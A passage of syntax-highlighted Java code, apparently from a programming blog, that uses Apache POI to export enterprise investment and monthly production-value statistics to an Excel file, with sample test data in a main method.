punctuation">)</span><span class="token punctuation">;</span>                    style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCounty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getCounty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getYearValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getYearValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getYesteryear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getYesteryear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getJanuary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getTotalInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getFebruary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getFebruary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getMarch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getMarch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getApril</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getApril</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">10</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getMay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getMay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">11</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getJune</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getJune</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">12</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getJuly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getJuly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">13</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getAugust</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getAugust</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">14</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getSeptember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getSeptember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">15</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getOctober</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getOctober</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">16</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getNovember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getNovember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">17</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDecember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">double</span> v <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>vo<span class="token punctuation">.</span><span class="token function">getDecember</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%.4f"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token comment" spellcheck="true">// handle default case</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                startRow<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        //       文件形式输出到磁盘中</span>        FileOutputStream out <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String uuid <span class="token operator">=</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"E:\\"</span> <span class="token operator">+</span> <span class="token string">"fileName2"</span> <span class="token operator">+</span> <span class="token string">".xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            workbook<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 设置输出流信息</span><span class="token comment" spellcheck="true">//        response.setContentType("application/octet-stream;charset=UTF-8");</span><span class="token comment" spellcheck="true">//        response.setHeader("Content-disposition", "attachment;filename=file.xlsx");</span><span class="token comment" spellcheck="true">//        response.addHeader("Pargam", "no-cache");</span><span class="token comment" spellcheck="true">//        response.addHeader("Cache-Control", "no-cache");</span><span class="token comment" spellcheck="true">//        // 创建输出流</span><span class="token comment" spellcheck="true">//        OutputStream outputStream = response.getOutputStream();</span><span class="token comment" spellcheck="true">//        // 将Workbook写入输出流</span><span class="token comment" spellcheck="true">//        workbook.write(outputStream);</span><span class="token comment" spellcheck="true">//        // 关闭Workbook和输出流</span><span class="token comment" spellcheck="true">//        workbook.close();</span><span class="token comment" spellcheck="true">//        outputStream.close();</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>EntProductionValueStatisticsV2<span class="token operator">></span> vo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        EntProductionValueStatisticsV2 v2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EntProductionValueStatisticsV2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setCounty</span><span class="token punctuation">(</span><span class="token string">"区域"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setTb</span><span class="token punctuation">(</span><span class="token string">"tb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setTotalInvestment</span><span class="token punctuation">(</span><span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setEntName</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setYearValue</span><span class="token punctuation">(</span><span class="token string">"2023"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setYesteryear</span><span class="token punctuation">(</span><span class="token string">"2022"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setJanuary</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setFebruary</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setMarch</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v2<span class="token punctuation">.</span><span class="token function">setApril</span><span class="token punctuation">(</span><span class="token 